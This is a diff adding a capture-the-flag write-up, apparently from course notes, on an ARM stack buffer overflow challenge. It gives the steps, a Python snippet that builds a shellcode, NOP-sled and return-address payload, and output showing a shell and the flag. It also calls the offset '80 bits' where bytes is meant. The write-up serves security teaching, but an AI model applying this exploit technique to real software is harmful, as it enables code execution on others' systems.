@@ -178,7 +178,55 @@ The problem statement is below.
 The problem statement is below.
 
 ```md
+Can you put your shellcode on the buffer and run that by exploiting a buffer overflow vulnerability in the program?
+```
 
+This problem requires you to
+
+- [ ] find a buffer start
+- [ ] detect return address
+- [ ] input sufficient number of characters to overflow it
+- [ ] embed shellcode
+- [ ] jump to the address of the shellcode
+
+The given program tells you the buffer start.
+
+```bash
+TXK220008@ctf-vm3:~/unit2/5-stack-ovfl-arm $ ./5-stack-ovfl-arm
+Your buffer is at: 0xfffef3f8
+Please type your name:
+```
+
+- [x] find a buffer start
+
+From the `stack-ovfl-arm.c`, you can tell the offset from the buffer. It's 80 bits. You can also check it using `gdb`.
+
+- [x] detect return address
+
+Here, we embed the shellcode, input the sufficient number of `nop`s, and address of the shellcode.
+
+```python
+        bufAddr = int(r.split(b":")[1].split(b"\n")[0], 16)
+        payload = [shellcode, asm("nop") * ((88 - len(shellcode)) // 2), p32(bufAddr)]
+        payload = b"".join(payload)
+```
+
+- [x] input sufficient number of characters to overflow it
+- [x] embed shellcode
+- [x] jump to the address of the shellcode
+
+You may encounter a problem that you can't execute it. Use loop and try-except to deal with it.
+
+You get the flag.
+
+```bash
+TXK220008@ctf-vm3:~/unit2/5-stack-ovfl-arm $ ./solve5.py
+[+] Starting local process './5-stack-ovfl-arm': pid 562067
+buffer address = fffefcd8
+[*] Switching to interactive mode
+Hello 0\x8f\xe2\xff/\xe12'\xdfFG'    F\xdf\xa0\xa1\xeb\xa2\xeb\xc2q\x0bA\xdf/bin/shX
+$ cat flag
+CS6332{sh3llc0de_0n_th3_St4ck}
 ```
 
 ## 6-stack-ovfl-use-envp-arm
